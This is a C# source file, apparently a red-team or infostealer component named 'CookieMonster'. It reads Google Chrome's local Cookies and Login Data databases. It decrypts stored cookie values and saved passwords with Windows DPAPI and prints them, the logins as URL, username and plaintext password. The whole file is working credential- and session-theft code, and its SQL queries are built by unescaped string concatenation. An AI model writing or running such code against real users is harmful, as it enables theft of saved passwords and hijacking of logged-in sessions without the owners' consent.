using System;
using System.Text;
using System.Security.Cryptography;
using Newtonsoft.Json;

// https://stackoverflow.com/questions/22532870/encrypted-cookies-in-chrome/25874366

namespace CookieMonster
{
    public class Chrome
    {
        public class Cookie
        {
            public string path { get; set; }
            public string domain { get; set; }
            public string name { get; set; }
            public string value { get; set; }
            public Int64 expirationdate { get; set; }
        }

        public static string GetCookiePath()
        {
            return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Cookies";
        }

        public static string GetCredPath()
        {
            return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data";
        }

        public static void ReadCookies(string dbPath, string domain, bool enc, string name)
        {
            string connectionString = "Data Source=" + dbPath + ";pooling=false";

            using (var conn = new System.Data.SQLite.SQLiteConnection(connectionString))
            using (var cmd = conn.CreateCommand())
            {
                string sql;

                if (enc == false) { sql = "SELECT path,name,value,expires_utc,host_key FROM cookies WHERE host_key LIKE '%"; } else { sql = "SELECT path,name,encrypted_value,expires_utc,host_key FROM cookies WHERE host_key LIKE '%"; }

                sql += domain + "%'";

                if (name != string.Empty) { sql += " AND name = '" + name + "'"; }

                cmd.CommandText = sql;
                conn.Open();

                using (var reader = cmd.ExecuteReader())
                {
                    string cookieValue;

                    while (reader.Read())
                    {
                        string cookiePath = (string)reader[0];
                        string cookieName = (string)reader[1];
                        Int64 cookieExpire = (Int64)reader[3];
                        string cookieDomain = (string)reader[4];


                        if (enc == false)
                        {
                            cookieValue = (string)reader[2];
                        }
                        else
                        {
                            var encData = (byte[])reader[2];
                            var decData = ProtectedData.Unprotect(encData, null, DataProtectionScope.CurrentUser);
                            cookieValue = Encoding.ASCII.GetString(decData);
                        }

                        Cookie cookie = new Cookie
                        {
                            path = cookiePath,
                            domain = cookieDomain,
                            name = cookieName,
                            value = cookieValue,
                            expirationdate = cookieExpire

                        };

                        string json = JsonConvert.SerializeObject(cookie);
                        Console.WriteLine(json);

                    }

                }

                conn.Close();

            }

        }

        public static void ReadCredentials(string credPath)
        {
            string connectionString = "Data Source=" + credPath + ";pooling=false";

            using (var conn = new System.Data.SQLite.SQLiteConnection(connectionString))
            using (var cmd = conn.CreateCommand())
            {

                cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
                conn.Open();

                using (var reader = cmd.ExecuteReader())
                {

                    while (reader.Read())
                    {
                        string URL = (string)reader[0];
                        string Username = (string)reader[1];
                        var encPass = (byte[])reader[2];
                        var decPass = ProtectedData.Unprotect(encPass, null, DataProtectionScope.CurrentUser);
                        string Pass = Encoding.ASCII.GetString(decPass);

                        if (Username != string.Empty && Pass != string.Empty)
                        {
                            Console.WriteLine("{0} :: {1} :: {2}", URL, Username, Pass);
                        }

                    }

                }

                conn.Close();

            }

        }

    }
}
